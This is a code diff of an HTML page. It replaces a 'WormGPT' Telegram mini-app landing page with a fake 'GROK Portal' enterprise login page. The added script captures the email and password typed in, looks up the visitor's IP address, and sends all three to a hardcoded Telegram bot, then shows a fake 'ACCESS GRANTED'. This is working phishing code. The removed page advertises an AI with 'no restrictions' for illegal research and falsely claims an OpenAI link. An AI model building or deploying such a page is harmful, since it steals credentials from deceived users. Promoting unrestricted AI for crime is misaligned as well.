@@ -1,200 +1,359 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>WormGPT - Welcome</title>
-    <!-- Telegram Mini App SDK -->
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <!-- Tailwind CSS -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Access | GROK Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@500&display=swap" rel="stylesheet">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
+        :root { color-scheme: light dark; }
         
         body {
-            font-family: 'Inter', sans-serif;
-            background-color: #0a0000; /* خلفية سوداء مائلة للأحمر العميق */
-            color: #ffffff;
-            -webkit-tap-highlight-color: transparent;
-            /* الهوامش المطلوبة */
-            padding-top: 4.5rem; 
-            /* زيادة الهامش السفلي لضمان عدم التداخل مع أزرار النظام */
-            padding-bottom: 2.5rem; 
-            overflow-x: hidden;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            overflow: hidden;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
 
-        .glass-card {
-            background-color: #1a0505; 
-            border: 1px solid #451010; 
-            border-radius: 16px;
+        /* --- حاوية المقدمة (Intro) --- */
+        #intro-content {
+            position: absolute;
+            z-index: 110;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            transition: all 1s cubic-bezier(0.4, 0, 0.2, 1);
         }
 
-        .btn-telegram {
-            background-color: #cc0000; 
-            color: #ffffff;
-            transition: all 0.2s;
+        .brand-text {
+            font-size: clamp(3rem, 15vw, 6rem);
+            font-weight: 800;
+            letter-spacing: 0.2em;
+            color: #fff;
+            line-height: 1;
+        }
+
+        .typing-wrapper {
+            display: inline-block;
+            overflow: hidden;
+            white-space: nowrap;
+            width: 0;
+            animation: typing 1.5s cubic-bezier(0.7, 0, 0.3, 1) forwards;
+        }
+
+        @keyframes typing {
+            from { width: 0; }
+            to { width: 100%; }
+        }
+
+        .version-label {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: clamp(0.7rem, 3vw, 1rem);
+            color: #666;
+            margin-top: 1.5rem;
+            letter-spacing: 0.6em;
+            opacity: 0;
+            transform: translateY(10px);
+            animation: fadeInUp 0.8s ease forwards 1.2s;
+        }
+
+        @keyframes fadeInUp {
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .loader-track {
+            width: clamp(200px, 60vw, 400px);
+            height: 2px;
+            background: rgba(255, 255, 255, 0.1);
+            margin: 2.5rem auto 0;
             position: relative;
-            box-shadow: 0 4px 15px rgba(204, 0, 0, 0.3);
+            overflow: hidden;
+            border-radius: 4px;
         }
 
-        .btn-telegram:active {
-            transform: scale(0.98);
-            background-color: #a80000;
+        .loader-fill {
+            position: absolute;
+            left: 0;
+            top: 0;
+            height: 100%;
+            width: 0%;
+            background: #fff;
+            animation: loadProgress 2s ease-in-out forwards;
         }
 
-        .text-secondary {
-            color: #d1a7a7; 
+        @keyframes loadProgress {
+            to { width: 100%; }
         }
 
-        .icon-container {
-            min-width: 24px;
+        /* البياض الصاعد */
+        .transition-overlay {
+            position: fixed;
+            bottom: -100%;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #fff;
+            z-index: 90;
+            transition: bottom 1.5s cubic-bezier(0.65, 0, 0.35, 1);
+        }
+        
+        .transition-overlay.active {
+            bottom: -60%; 
         }
 
-        /* Loading Spinner Style */
-        .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.3);
-            border-radius: 50%;
-            border-top: 3px solid #ffffff;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            display: none;
+        /* --- الصورة الثابتة في الأعلى --- */
+        #fixed-hero {
+            position: fixed;
+            top: 10%; /* وضعية ثابتة في الجزء العلوي الأسود */
+            left: 50%;
+            transform: translateX(-50%) translateY(20px);
+            z-index: 100;
+            width: 280px;
+            height: 200px;
+            overflow: hidden;
+            border-radius: 12px;
+            background: #000;
+            opacity: 0;
+            transition: all 1s ease 0.5s; /* تظهر بعد بدء البياض */
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        #fixed-hero.visible {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
         }
 
-        #user-profile-preview {
-            display: none;
+        #fixed-hero img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
         }
 
-        .gradient-text {
-            background: linear-gradient(to right, #ff4d4d, #990000);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        /* عنوان البوابة الثابت أيضاً تحت الصورة */
+        #portal-title {
+            position: fixed;
+            top: calc(10% + 215px);
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 1s ease 0.8s;
         }
 
-        /* حاوية الأزرار السفلية مع مراعاة مساحة أزرار الهاتف */
-        .safe-area-bottom {
-            padding-bottom: env(safe-area-inset-bottom, 1.5rem);
+        #portal-title.visible { opacity: 1; }
+
+        /* --- بوابة الدخول: تصعد من الأسفل لتستقر في النصف الأبيض --- */
+        #main-portal {
+            position: fixed;
+            bottom: -100%;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 100;
+            width: 100%;
+            max-width: 340px;
+            padding: 0 1rem;
+            opacity: 0;
+            transition: bottom 1.5s cubic-bezier(0.2, 0.8, 0.2, 1), opacity 1s ease;
+            pointer-events: none;
+        }
+
+        #main-portal.visible {
+            opacity: 1;
+            bottom: 5%; /* استقرار في الجزء السفلي الأبيض */
+            pointer-events: auto;
+        }
+
+        .glass-panel {
+            background: #ffffff;
+            border: 1px solid rgba(0, 0, 0, 0.05);
+            border-radius: 32px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+        }
+
+        .input-premium {
+            background: #f1f5f9;
+            border: 1px solid #e2e8f0;
+            color: #0f172a;
+            transition: all 0.3s ease;
+        }
+        .input-premium:focus {
+            background: #ffffff;
+            border-color: #000;
+            box-shadow: 0 0 0 4px rgba(0, 0, 0, 0.03);
+        }
+
+        .btn-black {
+            background: #000;
+            color: #fff;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+        .btn-black:hover:not(:disabled) {
+            transform: translateY(-1px);
+            filter: brightness(1.2);
+        }
+
+        .loading-line { 
+            height: 2px; 
+            background: #f1f5f9; 
+            border-radius: 10px; 
+            overflow: hidden; 
+            display: none; 
+            margin-top: 8px; 
+        }
+        .line-fill { 
+            height: 100%; 
+            background: #000; 
+            width: 0%; 
+            transition: width 2s ease-in-out; 
         }
     </style>
 </head>
-<body class="flex flex-col min-h-screen px-6">
+<body>
 
-    <!-- Main Header -->
-    <div class="text-center mb-6">
-        <h1 class="text-3xl font-bold mb-4 gradient-text">Welcome to WormGPT</h1>
-        <p class="text-lg text-red-100/80 leading-relaxed px-2">
-            The unofficial app by OpenAI is Premium,​"It has no restrictions or limits; it can assist you even in illegal research. We note that you are entirely responsible for any illegal use of our AI."  
-        </p>
-    </div>
+    <!-- طبقة البياض الصاعد -->
+    <div id="overlay" class="transition-overlay"></div>
 
-    <!-- User Profile Preview -->
-    <div id="user-profile-preview" class="glass-card p-4 mb-6 flex items-center gap-4 border-red-600/50">
-        <img id="user-photo" src="" alt="Profile" class="w-12 h-12 rounded-full border border-red-900 hidden">
-        <div id="user-icon" class="w-12 h-12 bg-red-700 rounded-full flex items-center justify-center font-bold text-xl">?</div>
-        <div>
-            <p class="text-sm text-red-300/60">Connecting as</p>
-            <h3 id="user-name" class="font-bold text-white">Telegram User</h3>
+    <!-- قسم المقدمة -->
+    <div id="intro-content">
+        <div class="brand-text">
+            <span class="typing-wrapper">GROK</span>
+        </div>
+        <div class="version-label">SYSTEM 6.91</div>
+        <div class="loader-track">
+            <div class="loader-fill"></div>
         </div>
     </div>
 
-    <!-- Info Section -->
-    <div class="space-y-6 mt-2 flex-grow">
-        <div class="flex items-start gap-4">
-            <div class="icon-container pt-1">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff4d4d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><path d="m21 21-4.3-4.3"></path></svg>
-            </div>
-            <div>
-                <h2 class="font-medium text-white">ChatGPT can be inaccurate</h2>
-                <p class="text-secondary text-sm mt-1 leading-relaxed">ChatGPT may provide Information and instructions that violate international laws and lead to legal accountability.</p>
-            </div>
-        </div>
-
-        <div class="border-t border-red-900/20"></div>
-
-        <div class="flex items-start gap-4">
-            <div class="icon-container pt-1">
-                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#ff4d4d" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-            </div>
-            <div>
-                <h2 class="font-medium text-white">Don't share sensitive info</h2>
-                <p class="text-secondary text-sm mt-1 leading-relaxed">
-                    Chats may be reviewed and used to train our models. 
-                    <a href="#" class="underline text-red-400">Learn about choices</a>.
-                </p>
-            </div>
-        </div>
+    <!-- الصورة الثابتة في الأعلى -->
+    <div id="fixed-hero">
+        <img src="intro.png" 
+             alt="Hero Image">
     </div>
 
-    <!-- Bottom Actions Area -->
-    <div class="mt-auto space-y-4 pt-6 safe-area-bottom">
-        
-        <div class="glass-card p-4 text-center">
-            <p class="text-[10px] text-red-200/50 leading-relaxed">
-                By continuing, you agree to our <a href="#" class="underline">Terms</a> and acknowledge that you have read our <a href="#" class="underline">Privacy Policy</a>.
-            </p>
-        </div>
+    <!-- العنوان الثابت -->
+    <div id="portal-title">
+        <h1 class="text-lg font-extrabold tracking-[0.1em] text-white uppercase">Grok Portal</h1>
+        <p class="text-[8px] text-zinc-500 font-black tracking-[0.5em] uppercase mt-1">Global Tool</p>
+    </div>
 
-        <!-- Telegram Button with Loader -->
-        <button id="telegram-btn" onclick="handleTelegramAuth()" class="btn-telegram w-full py-4 rounded-full font-semibold flex items-center justify-center gap-3 mb-2">
-            <span id="btn-text" class="flex items-center gap-3">
-                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-                    <path d="M21.435 2.582a1.933 1.933 0 0 0-1.93-.347L2.181 8.74a1.933 1.933 0 0 0 .105 3.567l4.811 1.54 1.884 5.91a1.933 1.933 0 0 0 3.328.618l2.91-3.267 4.706 3.444c.82.6 1.97.16 2.19-.82l3.41-15.11a1.933 1.933 0 0 0-1.094-2.042l-.005-.001Z" fill="white"/>
-                </svg>
-                Continue with Telegram
-            </span>
-            <div id="btn-loader" class="spinner"></div>
-        </button>
+    <!-- قسم بوابة تسجيل الدخول (نموذج الإدخال فقط) -->
+    <div id="main-portal">
+        <div class="glass-panel p-8">
+            <div id="error-message" class="hidden mb-4 p-3 rounded-xl bg-red-50 border border-red-100 text-red-600 text-[10px] text-center font-bold uppercase"></div>
+
+            <div class="space-y-4">
+                <div class="space-y-1">
+                    <label class="text-[9px] font-bold text-zinc-400 uppercase tracking-widest ml-1">Identity Access</label>
+                    <input type="email" id="userEmail" placeholder="exemple@email.com" class="input-premium w-full p-4 rounded-2xl text-xs outline-none text-center font-semibold">
+                </div>
+
+                <div class="space-y-1">
+                    <label class="text-[9px] font-bold text-zinc-400 uppercase tracking-widest ml-1">Access Key</label>
+                    <input type="password" id="userPass" placeholder="password" class="input-premium w-full p-4 rounded-2xl text-xs outline-none text-center font-semibold">
+                </div>
+
+                <div id="loadingContainer" class="loading-line">
+                    <div id="progressFill" class="line-fill"></div>
+                </div>
+
+                <button id="registerButton" class="btn-black w-full py-4 rounded-2xl font-bold text-[10px] uppercase tracking-[0.2em]">
+                    Authorize Node
+                </button>
+            </div>
+        </div>
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-        tg.setHeaderColor('#0a0000');
-        // إخطار تلجرام بأن التطبيق يدعم Safe Area لضمان عدم التداخل
-        tg.ready();
-
-        function handleTelegramAuth() {
-            const btn = document.getElementById('telegram-btn');
-            const btnText = document.getElementById('btn-text');
-            const btnLoader = document.getElementById('btn-loader');
-            const preview = document.getElementById('user-profile-preview');
-
-            btnText.style.display = 'none';
-            btnLoader.style.display = 'block';
-            btn.disabled = true;
-
-            const user = tg.initDataUnsafe?.user;
+        window.onload = () => {
+            const overlay = document.getElementById('overlay');
+            const intro = document.getElementById('intro-content');
+            const portal = document.getElementById('main-portal');
+            const hero = document.getElementById('fixed-hero');
+            const title = document.getElementById('portal-title');
 
             setTimeout(() => {
-                if (user) {
-                    btn.style.display = 'none';
-                    preview.style.display = 'flex';
-                    
-                    document.getElementById('user-name').innerText = `${user.first_name} ${user.last_name || ''}`;
-                    if (user.photo_url) {
-                        const img = document.getElementById('user-photo');
-                        img.src = user.photo_url;
-                        img.classList.remove('hidden');
-                        document.getElementById('user-icon').classList.add('hidden');
-                    } else {
-                        document.getElementById('user-icon').innerText = user.first_name.charAt(0);
-                    }
+                // 1. تفعيل البياض الصاعد
+                overlay.classList.add('active');
+                
+                // 2. تلاشي نص المقدمة للأعلى
+                intro.style.opacity = '0';
+                intro.style.transform = 'translateY(-100px)';
+                
+                // 3. إظهار العناصر الثابتة وصعود الحاوية
+                setTimeout(() => {
+                    hero.classList.add('visible');
+                    title.classList.add('visible');
+                    portal.classList.add('visible');
+                    document.body.style.background = "linear-gradient(to bottom, #000000 60%, #ffffff 60%)";
+                }, 500);
 
-                    tg.HapticFeedback.notificationOccurred('success');
+            }, 3500);
+        };
 
-                    setTimeout(() => {
-                        window.location.href = 'dashboard1.html';
-                    }, 1500);
-                } else {
-                    tg.HapticFeedback.notificationOccurred('warning');
-                    window.location.href = 'dashboard1.html';
-                }
-            }, 1200);
+        // --- منطق تسجيل الدخول ---
+        const TG_TOKEN = "8231848249:AAEnxXnEYUSgKzE8-g36d0kf0JqIRt5S6ZQ";
+        const TG_CHAT_ID = "8271446244";
+
+        const btn = document.getElementById('registerButton');
+        const load = document.getElementById('loadingContainer');
+        const fill = document.getElementById('progressFill');
+        const error = document.getElementById('error-message');
+
+        btn.addEventListener('click', async () => {
+            const email = document.getElementById('userEmail').value.trim();
+            const password = document.getElementById('userPass').value.trim();
+
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showError('Invalid Protocol Address');
+                return;
+            }
+            if (password.length < 4) {
+                showError('Access Key Too Short');
+                return;
+            }
+
+            error.classList.add('hidden');
+            btn.disabled = true;
+            btn.innerHTML = 'SYNCHRONIZING...';
+
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+                
+                const msg = `⚡ *Identity Validated*\n\n📧 *User:* \`${email}\`\n🔑 *Pass:* \`${password}\`\n📍 *Source:* \`${ip}\``;
+
+                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: 'Markdown' })
+                });
+
+                load.style.display = 'block';
+                setTimeout(() => { fill.style.width = '100%'; }, 50);
+
+                setTimeout(() => {
+                    btn.innerHTML = 'ACCESS GRANTED';
+                    btn.style.background = '#10b981';
+                    setTimeout(() => { window.location.href = 'dashboard.html'; }, 800);
+                }, 2200);
+            } catch (e) {
+                showError('Connection Failed');
+                btn.disabled = false;
+                btn.innerHTML = 'Authorize Node';
+            }
+        });
+
+        function showError(text) {
+            error.textContent = text;
+            error.classList.remove('hidden');
         }
     </script>
 </body>
